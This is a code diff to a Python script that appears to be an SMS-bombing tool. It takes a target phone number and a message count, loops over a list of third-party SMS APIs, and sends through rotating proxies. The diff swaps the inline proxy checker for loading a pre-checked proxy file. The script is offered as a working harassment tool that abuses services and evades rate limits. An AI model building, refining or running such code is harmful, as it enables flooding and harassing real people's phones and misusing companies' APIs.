@@ -2,7 +2,7 @@ import requests
 import time
 import argparse
 import random
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 
 WORKING_APIS = {
     "DNS": {
@@ -22,40 +22,15 @@ HEADERS = {
     "Accept": "application/json, text/plain, */*"
 }
 
-def check_proxy(proxy):
-    try:
-        test_url = "http://httpbin.org/ip"
-        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-        r = requests.get(test_url, proxies=proxies, timeout=3)
-        if r.status_code == 200:
-            return proxy
-    except:
-        pass
-    return None
-
-def load_and_check_proxies(filename="proxies.txt"):
+def load_working_proxies(filename="working_proxies.txt"):
     try:
         with open(filename, "r") as f:
-            raw_proxies = [line.strip() for line in f if line.strip()]
+            proxies = [line.strip() for line in f if line.strip()]
+        print(f"[*] Loaded {len(proxies)} working proxies from {filename}.")
+        return proxies
     except FileNotFoundError:
-        print(f"[!] File {filename} not found. Proceeding without proxies.")
+        print(f"[!] File {filename} not found. Run checker.py first.")
         return []
-
-    print(f"[*] Loaded {len(raw_proxies)} proxies. Testing first 300...")
-    
-    working = []
-    test_batch = raw_proxies[:300]
-    
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = [executor.submit(check_proxy, p) for p in test_batch]
-        for future in as_completed(futures):
-            result = future.result()
-            if result:
-                working.append(result)
-                print(f"[+] Working proxy found: {result} (Total: {len(working)})")
-                
-    print(f"[*] Proxy check complete. {len(working)} working proxies.")
-    return working
 
 def send_sms(service_name, api_data, phone, proxy_pool):
     try:
@@ -85,11 +60,10 @@ def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-p", "--phone", required=True)
     parser.add_argument("-c", "--count", type=int, default=1)
-    parser.add_argument("-f", "--file", type=str, default="proxies.txt")
     args = parser.parse_args()
 
     phone = args.phone
-    proxy_pool = load_and_check_proxies(args.file)
+    proxy_pool = load_working_proxies()
 
     print(f"\n[*] Target: {phone}")
     print(f"[*] APIs: {len(WORKING_APIS)}")
